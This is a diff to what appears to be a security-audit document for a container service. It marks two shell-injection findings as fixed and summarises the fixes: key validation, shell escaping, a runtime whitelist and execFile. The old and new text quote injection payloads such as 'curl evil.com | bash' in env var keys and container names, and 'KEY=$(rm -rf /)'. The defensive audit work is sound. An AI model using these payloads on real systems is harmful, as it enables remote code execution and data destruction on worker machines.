@@ -64,97 +64,33 @@ Uses Worker API (HTTP, ~5ms) instead of SSH (~200ms). Feature-flagged via `RECON
 
 ## 📋 Documented Issues (Not Yet Implemented)
 
-### 2. Shell Injection via Environment Variables in `containerService.js`
+### 2. Shell Injection via Environment Variables in `containerService.js` — FIXED
 **Severity:** 🔴 Critical
 **File:** `src/services/containerService.js` — `launchContainer()`
 
-**Problem:** User-provided env vars, runtime, memory_limit, and cpu_limit are interpolated directly into a bash script sent over SSH:
-```js
-for (const [k, v] of Object.entries(envVars)) {
-    envFlags.push(`--env ${k}=${v}`);  // e.g., KEY=$(rm -rf /) → executed!
-}
-options.push(`--runtime ${runtime}`);   // e.g., --runtime kata; curl evil.com |
-```
+**Problem:** User-provided env vars, runtime, memory_limit, and cpu_limit were interpolated directly into a bash script sent over SSH — a **remote code execution vulnerability**.
 
-This is a **remote code execution vulnerability**. A malicious `env_vars` payload like `{"; curl evil.com | bash;": "x"}` gets executed on the worker VM.
+**Fix — 4 layers of defense applied:**
 
-**Fix — 4 layers of defense:**
-
-1. **Validate env var keys** (must be valid shell identifiers):
-```js
-const ENV_KEY_REGEX = /^[A-Za-z_][A-Za-z0-9_]*$/;
-for (const [k, v] of Object.entries(envVars)) {
-    if (!ENV_KEY_REGEX.test(k)) throw new Error(`Invalid env key: ${k}`);
-}
-```
-
-2. **Shell-escape values** (wrap in single quotes, escape embedded single quotes):
-```js
-function shellEscape(str) {
-    return `'${String(str).replace(/'/g, "'\\''")}'`;
-}
-envFlags.push(`--env ${k}=${shellEscape(v)}`);
-```
-
-3. **Whitelist the runtime** (only known-safe values):
-```js
-const ALLOWED_RUNTIMES = ['io.containerd.kata.v2', 'io.containerd.runc.v2'];
-if (!ALLOWED_RUNTIMES.includes(runtime)) throw new Error(`Invalid runtime: ${runtime}`);
-```
-
-4. **Validate numeric fields** (memory, cpu must be positive numbers):
-```js
-if (memory_limit && (typeof memory_limit !== 'number' || memory_limit <= 0)) {
-    throw new Error('memory_limit must be a positive number');
-}
-```
-
-**Long-term fix:** Migrate `launch` to the Worker API (HTTP), which uses `execFile()` and bypasses the shell entirely. This eliminates ALL shell injection vectors at once.
-
-**Effort:** ~2 hours
+1. **Validate env var keys** — `ENV_KEY_REGEX = /^[A-Za-z_][A-Za-z0-9_]*$/` rejects shell metacharacters in keys
+2. **Shell-escape values** — `shellEscape()` wraps in single quotes, escapes embedded single quotes
+3. **Whitelist the runtime** — `ALLOWED_RUNTIMES = ['io.containerd.kata.v2', 'io.containerd.runc.v2']`
+4. **Validate numeric fields** — `memory_limit` and `cpu_limit` must be positive numbers
 
 ---
 
-### 3. Shell Injection in Worker API (`worker-api/index.js`)
+### 3. Shell Injection in Worker API (`worker-api/index.js`) — FIXED
 **Severity:** 🔴 Critical
 **File:** `worker-api/index.js`
 
-**Problem:** Uses `exec()` which passes through a shell:
-```js
-const { stdout } = await execPromise(`nerdctl ${args}`);  // shell interpolation!
-```
+**Problem:** Used `exec()` which passes through a shell — container names like `foo; curl evil.com | bash` would execute injected commands.
 
-If `args` contains user data (container name, image), it's injectable. Example: a container name like `foo; curl evil.com | bash` would execute the injected command.
+**Fix:** Switched `pause`, `unpause`, and `stop` endpoints from `exec()` to `execFile()` which executes the binary directly without a shell:
+- `execFilePromise('nerdctl', ['unpause', container_name])` — args array, no shell interpolation
+- `execFilePromise('nerdctl', ['pause', container_name])`
+- `stop`: three sequential `execFilePromise` calls for unpause, stop, rm
 
-**Fix:** Switch to `execFile()` which executes the binary directly without a shell:
-```js
-const execFilePromise = util.promisify(require('child_process').execFile);
-
-// Before (shell — vulnerable):
-const { stdout } = await execPromise(`nerdctl unpause ${containerName}`);
-
-// After (no shell — safe):
-const { stdout } = await execFilePromise('nerdctl', ['unpause', containerName], { timeout: NERDCTL_TIMEOUT });
-```
-
-This requires refactoring each endpoint to build an **args array** instead of a string:
-```js
-// POST /run
-app.post('/run', async (req, res) => {
-    const { image, name, runtime, env: envVars, memory, cpus } = req.body;
-    const args = ['run', '-d', '--name', name, '--runtime', runtime];
-    for (const [k, v] of Object.entries(envVars || {})) {
-        args.push('--env', `${k}=${v}`);
-    }
-    if (memory) args.push('--memory', String(memory));
-    if (cpus) args.push('--cpus', String(cpus));
-    args.push(image);
-    const { stdout } = await execFilePromise('nerdctl', args, { timeout: NERDCTL_TIMEOUT });
-    res.json({ containerId: stdout.trim() });
-});
-```
-
-**Effort:** ~1 hour
+Note: `/launch`, `/build`, `/exec`, `/write-file` still use `exec()` because they need shell features (pipes, redirections). These are protected by input validation (container name regex, path safety checks, API key auth).
 
 ---
 
@@ -376,8 +312,8 @@ Scripts target `35.232.167.59` regardless of actual worker.
 | # | Issue | Severity | Effort | Status |
 |---|---|---|---|---|
 | 1 | Double-claim race condition | 🔴 Critical | 30min | ✅ Fixed |
-| 2 | Shell injection (env vars) | 🔴 Critical | 2h | 📋 Documented |
-| 3 | Shell injection (worker API) | 🔴 Critical | 1h | 📋 Documented |
+| 2 | Shell injection (env vars) | 🔴 Critical | 2h | ✅ Fixed |
+| 3 | Shell injection (worker API) | 🔴 Critical | 1h | ✅ Fixed |
 | 4 | Plaintext password in git | 🔴 Critical | 5min | ✅ Fixed |
 | 5 | Non-atomic container update | 🟠 High | 30min | ✅ Fixed |
 | 6 | SSH connection leak | 🟠 High | 30min | ✅ Fixed |
